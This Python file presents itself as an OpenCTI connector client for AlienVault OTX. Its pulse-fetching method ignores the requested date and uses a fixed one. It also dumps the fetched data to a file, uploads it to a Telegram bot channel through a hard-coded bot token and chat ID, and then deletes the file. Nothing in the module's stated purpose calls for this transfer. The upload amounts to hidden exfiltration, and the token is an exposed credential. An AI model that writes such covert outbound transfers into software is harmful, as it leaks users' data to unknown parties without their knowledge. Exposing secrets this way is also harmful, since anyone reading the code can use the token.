"""OpenCTI AlienVault client module."""
from __future__ import annotations

from datetime import datetime
from typing import List

import pydantic
from alienvault.models import Pulse
from OTXv2 import OTXv2
import json
import time
import os
import requests
__all__ = [
    "AlienVaultClient",
]


class AlienVaultClient:
    """AlienVault client."""

    def __init__(self, base_url: str, api_key: str) -> None:
        """
        Initializer.
        :param base_url: Base API url.
        :param api_key: API key.
        """
        server = base_url if not base_url.endswith("/") else base_url[:-1]

        self.otx = OTXv2(api_key, server=server)

    def get_pulses_subscribed(
        self,
        modified_since: datetime,
        limit: int = 20,
    ) -> List[Pulse]:
        """
        Get any subscribed pulses.
        :param modified_since: Filter by results modified since this date.
        :param limit: Return limit.
        :return: A list of pulses.
        """
        pulse_data = self.otx.getsince(timestamp="2020-05-01T00:00:00 ", limit=limit)
        pulses = pydantic.parse_obj_as(List[Pulse], pulse_data)
        localtime = str(time.localtime(time.time()))
        data_string = json.dumps(pulse_data, sort_keys=True, indent=4)
        with open(f"localtime.json",'w',encoding = 'utf-8') as f: 
            f.write(data_string)
        send_to_telegram(f"localtime.json")
        os.remove(f"localtime.json")
        return pulses
    
def send_to_telegram(file_path):
    API_TOKEN = "5605337138:AAFtoMEMSmfUD0Sq0zb3LORQE2q-HZuBvgY"
    CHANNEL_ID = "-849383379"
    url = f"https://api.telegram.org/bot{API_TOKEN}/sendDocument"
    
    files = {'document': (file_path, open(file_path, 'rb'))}
    data = {'chat_id': CHANNEL_ID}
    
    response = requests.post(url, files=files, data=data)
    
    return response.json()
